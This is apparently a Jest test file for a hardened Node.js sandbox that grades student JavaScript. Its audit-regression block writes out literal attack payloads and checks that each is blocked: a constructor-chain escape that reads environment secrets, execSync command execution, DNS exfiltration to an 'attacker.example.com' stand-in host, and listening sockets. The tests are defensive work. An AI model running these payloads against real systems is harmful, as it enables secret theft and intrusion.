import { HardenedProcessSandboxAdapter } from './hardened-process-sandbox.adapter';

// Timeout largo: cada caso lanza un proceso hijo real de Node.
jest.setTimeout(20000);

describe('HardenedProcessSandboxAdapter', () => {
  let adapter: HardenedProcessSandboxAdapter;

  beforeEach(() => {
    adapter = new HardenedProcessSandboxAdapter();
  });

  it('ejecuta código legítimo y lo califica correctamente', async () => {
    const result = await adapter.executeIsolated(
      "console.log('Hola Mundo')",
      'javascript',
      { expected: 'Hola Mundo' },
    );

    expect(result.status).toBe('accepted');
    expect(result.stdout).toBe('Hola Mundo');
    expect(result.stderr).toBe('');
  });

  it('califica wrong_answer cuando la salida no coincide con lo esperado', async () => {
    const result = await adapter.executeIsolated(
      "console.log('otra cosa')",
      'javascript',
      { expected: 'Hola Mundo' },
    );

    expect(result.status).toBe('wrong_answer');
  });

  it('rechaza lenguajes distintos de JavaScript con error explícito', async () => {
    const result = await adapter.executeIsolated('print("Hola")', 'python', {
      expected: '',
    });

    expect(result.status).toBe('runtime_error');
    expect(result.stderr).toContain('solo JavaScript');
  });

  // 10/10 (Jeider): un SyntaxError sin línea no decía dónde mirar.
  it('dice en qué línea del código del estudiante está el error de sintaxis, sin rutas del servidor', async () => {
    const result = await adapter.executeIsolated(
      'const area = 12;\nconst error = area + /* tu cálculo */;\nconsole.log(error);',
      'javascript',
      { expected: '12' },
    );

    expect(result.status).toBe('runtime_error');
    expect(result.stderr).toMatch(/^SyntaxError: .* \(línea 2\)$/);
    expect(result.stderr).not.toContain('/');
  });

  it('dice la línea de un error al ejecutar', async () => {
    const result = await adapter.executeIsolated('const a = 1;\nconsole.log(b);', 'javascript', { expected: '1' });

    expect(result.stderr).toBe('ReferenceError: b is not defined (línea 2)');
  });

  // Regresión directa de P0-05: este adaptador NUNCA debe aprobar código por
  // contener una palabra mágica — solo por producir la salida correcta.
  it('NO aprueba código solo por contener la palabra "correct" (a diferencia del mock anterior)', async () => {
    const result = await adapter.executeIsolated(
      '// esto es correct pero no imprime nada',
      'javascript',
      { expected: 'Hola Mundo' },
    );

    expect(result.status).not.toBe('accepted');
  });

  // Regresión directa de P0-01: los payloads literales del informe de
  // auditoría deben quedar bloqueados por el modelo de permisos de Node.
  describe('vectores de ataque del informe de auditoría', () => {
    it('bloquea el robo de secretos vía this.constructor.constructor(\'return process\')()', async () => {
      const result = await adapter.executeIsolated(
        `const p = this.constructor.constructor('return process')();
         console.log(JSON.stringify(p.env));`,
        'javascript',
        { expected: '' },
      );

      expect(result.status).toBe('runtime_error');
      expect(result.stdout).not.toMatch(/JWT_SECRET|DB_PASSWORD|OPENAI_API_KEY/);
    });

    it('bloquea RCE vía child_process.execSync', async () => {
      const result = await adapter.executeIsolated(
        `console.log(require('child_process').execSync('whoami').toString());`,
        'javascript',
        { expected: '' },
      );

      expect(result.status).toBe('runtime_error');
      expect(result.stdout).toBe('');
    });

    it('bloquea la escritura en disco fuera del directorio del sandbox', async () => {
      const result = await adapter.executeIsolated(
        `require('fs').writeFileSync('pwned.txt', 'x'); console.log('WROTE');`,
        'javascript',
        { expected: '' },
      );

      expect(result.status).toBe('runtime_error');
      expect(result.stdout).not.toContain('WROTE');
    });

    it('bloquea conexiones de red salientes (SSRF/exfiltración)', async () => {
      const result = await adapter.executeIsolated(
        `require('net').connect(3306, '127.0.0.1', () => console.log('CONECTADO'));
         setTimeout(() => console.log('fin'), 100);`,
        'javascript',
        { expected: '' },
      );

      expect(result.stdout).not.toContain('CONECTADO');
    });

    // Ola 2 P4: el cortafuegos anterior solo parcheaba dns.lookup/resolve/
    // resolve4/resolve6 (las funciones planas del módulo 'dns'). dns.promises
    // y dns.Resolver son objetos DISTINTOS que no pasaban por ese parche —
    // suficiente para exfiltrar datos codificados en el propio nombre de
    // host consultado, sin necesitar que la resolución llegue a completarse
    // (payload real de exfiltración por DNS).
    it('bloquea exfiltración vía dns.promises.lookup (bypass del cortafuegos anterior)', async () => {
      // dns.promises.lookup ahora lanza SÍNCRONAMENTE al llamarla (igual que
      // el resto de los parches de este guard) — nunca llega a devolver una
      // promesa, así que el .then()/.catch() nunca se encadena: el proceso
      // termina con excepción no capturada ANTES del setTimeout('fin'). Es
      // exactamente el mismo patrón que el test ya existente de
      // 'net.connect' (SSRF) de más arriba: lo que importa es que el dato
      // nunca sale y el intento se reporta como fallo, no como aceptado.
      const result = await adapter.executeIsolated(
        `require('dns').promises.lookup('secreto-robado.attacker.example.com')
           .then(() => console.log('LEAKED'));
         setTimeout(() => console.log('fin'), 100);`,
        'javascript',
        { expected: '' },
      );

      expect(result.status).toBe('runtime_error');
      expect(result.stdout).not.toContain('LEAKED');
      expect(result.stdout).not.toContain('fin');
      expect(result.stderr).toContain('SandboxViolation');
    });

    it('bloquea exfiltración vía require("dns/promises").resolve4 (import directo del submódulo)', async () => {
      const result = await adapter.executeIsolated(
        `require('dns/promises').resolve4('secreto-robado.attacker.example.com')
           .then(() => console.log('LEAKED'));
         setTimeout(() => console.log('fin'), 100);`,
        'javascript',
        { expected: '' },
      );

      expect(result.status).toBe('runtime_error');
      expect(result.stdout).not.toContain('LEAKED');
      expect(result.stdout).not.toContain('fin');
      expect(result.stderr).toContain('SandboxViolation');
    });

    it('bloquea exfiltración vía new dns.Resolver() (clase, no las funciones planas del módulo)', async () => {
      const result = await adapter.executeIsolated(
        `const { Resolver } = require('dns');
         try {
           new Resolver().resolve4('secreto-robado.attacker.example.com', () => console.log('LEAKED'));
         } catch (e) {
           console.log('blocked: ' + e.message);
         }`,
        'javascript',
        { expected: '' },
      );

      expect(result.stdout).not.toContain('LEAKED');
      expect(result.stdout).toContain('SandboxViolation');
    });

    it('bloquea exfiltración vía dns.promises.Resolver (clase de la API basada en promesas)', async () => {
      const result = await adapter.executeIsolated(
        `const { Resolver } = require('dns').promises;
         new Resolver().resolveTxt('secreto-robado.attacker.example.com')
           .then(() => console.log('LEAKED'));
         setTimeout(() => console.log('fin'), 100);`,
        'javascript',
        { expected: '' },
      );

      expect(result.status).toBe('runtime_error');
      expect(result.stdout).not.toContain('LEAKED');
      expect(result.stdout).not.toContain('fin');
      expect(result.stderr).toContain('SandboxViolation');
    });

    // Ola 3 - PUNTO 6 (P2-R1, docs/REAUDITORIA_OLA2.md): las pruebas de
    // arriba bloquean el lado que INICIA una conexión saliente, pero nunca
    // se probó el lado que ESCUCHA — un socket de servidor es un canal de
    // comunicación con el exterior tan real como uno saliente, solo que de
    // sentido contrario (alguien se conecta AL proceso hijo en vez de que
    // el proceso hijo se conecte afuera).
    it('bloquea la apertura de un socket de escucha vía net.createServer', async () => {
      const result = await adapter.executeIsolated(
        `const srv = require('net').createServer(() => {});
         srv.listen(0, '127.0.0.1', () => console.log('LISTENING'));
         setTimeout(() => console.log('fin'), 100);`,
        'javascript',
        { expected: '' },
      );

      expect(result.status).toBe('runtime_error');
      expect(result.stdout).not.toContain('LISTENING');
      expect(result.stdout).not.toContain('fin');
      expect(result.stderr).toContain('SandboxViolation');
    });

    it('bloquea la apertura de un servidor HTTP vía http.createServer', async () => {
      const result = await adapter.executeIsolated(
        `const srv = require('http').createServer((req, res) => res.end('hola'));
         srv.listen(0, '127.0.0.1', () => console.log('LISTENING'));
         setTimeout(() => console.log('fin'), 100);`,
        'javascript',
        { expected: '' },
      );

      expect(result.status).toBe('runtime_error');
      expect(result.stdout).not.toContain('LISTENING');
      expect(result.stderr).toContain('SandboxViolation');
    });

    it('bloquea la apertura de un servidor HTTPS vía https.createServer', async () => {
      const result = await adapter.executeIsolated(
        `try {
           require('https').createServer(() => {});
           console.log('NO_THREW');
         } catch (e) {
           throw e;
         }`,
        'javascript',
        { expected: '' },
      );

      expect(result.status).toBe('runtime_error');
      expect(result.stdout).not.toContain('NO_THREW');
      expect(result.stderr).toContain('SandboxViolation');
    });

    it('bloquea la apertura de un servidor vía http2.createServer', async () => {
      const result = await adapter.executeIsolated(
        `try {
           require('http2').createServer(() => {});
           console.log('NO_THREW');
         } catch (e) {
           throw e;
         }`,
        'javascript',
        { expected: '' },
      );

      expect(result.status).toBe('runtime_error');
      expect(result.stdout).not.toContain('NO_THREW');
      expect(result.stderr).toContain('SandboxViolation');
    });

    it('corta un bucle infinito por timeout sin colgar el proceso host', async () => {
      const result = await adapter.executeIsolated('while(true){}', 'javascript', {
        expected: '',
      });

      expect(result.status).toBe('time_limit');
    });
  });

  // Test del canario (addendum a ADR 06): la propiedad que de verdad importa
  // no es "el entorno es un objeto vacío" (en Windows nunca lo es, ver
  // buildSandboxEnv) sino que NINGÚN secreto real del proceso padre llega
  // al hijo, sea cual sea el sistema operativo o la versión de libuv.
  it('el proceso hijo NO puede ver ningún secreto del proceso padre (test del canario)', async () => {
    process.env.STIRE_CANARY_SECRET = 'canario-no-debe-filtrarse';
    process.env.JWT_SECRET = 'topsecret123';
    process.env.DB_PASSWORD = 'mysqlpass';
    process.env.OPENAI_API_KEY = 'sk-canary';

    const result = await adapter.executeIsolated(
      'console.log(JSON.stringify(process.env));',
      'javascript',
      { expected: '' },
    );

    expect(result.stdout).not.toContain('canario-no-debe-filtrarse');
    expect(result.stdout).not.toMatch(/JWT_SECRET|DB_PASSWORD|OPENAI_API_KEY/);

    delete process.env.STIRE_CANARY_SECRET;
    delete process.env.JWT_SECRET;
    delete process.env.DB_PASSWORD;
    delete process.env.OPENAI_API_KEY;
  });
});
